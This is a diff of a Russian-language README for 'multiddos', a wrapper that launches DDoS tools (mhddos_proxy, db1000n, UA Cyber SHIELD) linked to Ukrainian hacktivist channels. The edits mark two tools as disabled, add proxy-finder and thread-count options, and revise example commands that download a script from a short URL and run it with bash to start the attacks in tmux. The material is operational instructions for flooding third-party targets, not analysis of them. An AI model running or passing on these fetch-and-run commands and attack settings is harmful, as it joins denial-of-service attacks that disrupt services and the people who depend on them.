@@ -12,8 +12,8 @@
 
 ### **На данный момент скрипт поддерживает:**
 * [Multiddos](https://github.com/KarboDuck/multiddos), ранее известный как auto_mhddos (обвертка для mhddos_proxy) от Украинского Жнеца ([канал](https://t.me/ukrainian_reaper_ddos), [чат](https://t.me/+azRzzKp-STpkMjNi))
-* ~~[db1000n ](https://github.com/Arriven/db1000n) от IT ARMY of Ukraine ([канал](https://t.me/itarmyofukraine2022), чат)~~ временно по умолчанию отключено
-* ~~[UA Cyber SHIELD](https://github.com/opengs/uashield) ([канал](https://t.me/uashield), чат)~~ временно по умолчанию отключено
+* ~~[db1000n ](https://github.com/Arriven/db1000n) от IT ARMY of Ukraine ([канал](https://t.me/itarmyofukraine2022), чат)~~ временно отключено
+* ~~[UA Cyber SHIELD](https://github.com/opengs/uashield) ([канал](https://t.me/uashield), чат)~~ временно отключено
 
 ### **Пояснение к выбору конкретных утилит**
 <details>
@@ -98,7 +98,7 @@ tmux a
 * **Переподключиться к сессии Tmux**. Если у вас всего одна сессия Tmux, то используйте: `tmux a` (tmux attach). Если у вас несколько сессий, подключайтесь по имени: `tmux attach-session -t multiddos`
 </details>
 
-# **Выбор конфигурации**
+# **Опции запуска**
 
 <details>
   <summary>развернуть</summary>
@@ -117,18 +117,16 @@ Multiddos запускается по умолчанию с gotop и multiddos. 
 
 `+v` добавить vnstat -l (мониторинг трафика)
 
-`+m` добавить matrix (эффект матрицы)
+`-p0` или `--no-proxy-finder` отключить proxy finder
 
-Пример команды (убрать gotop и добавить matrix):
+`-p 2000` или `--proxy-threads 2000` задать количество потоков для proxy finder. Чем выше значение, тем быстрее происходит сканирование и поиск новых прокси, но тем и выше нагрузка на CPU и сеть. Поэтому при больших значениях может падать скорость атак.
 
-```
-curl -LO tiny.one/multiddos && bash multiddos -g +m && tmux a
-```
+`-t 500` или `--threads 500` задать количество потоков для mhddos_proxy. 
 
-Для изменения кол-ва потоков используйте `-t`
+Пример команды (убрать gotop и включить 2000 потоков для proxy finder):
 
 ```
-curl -LO tiny.one/multiddos && bash multiddos -t 1000 && tmux a
+curl -LO tiny.one/multiddos && bash multiddos -g -p 2000 && tmux a
 ```
 
 </details>
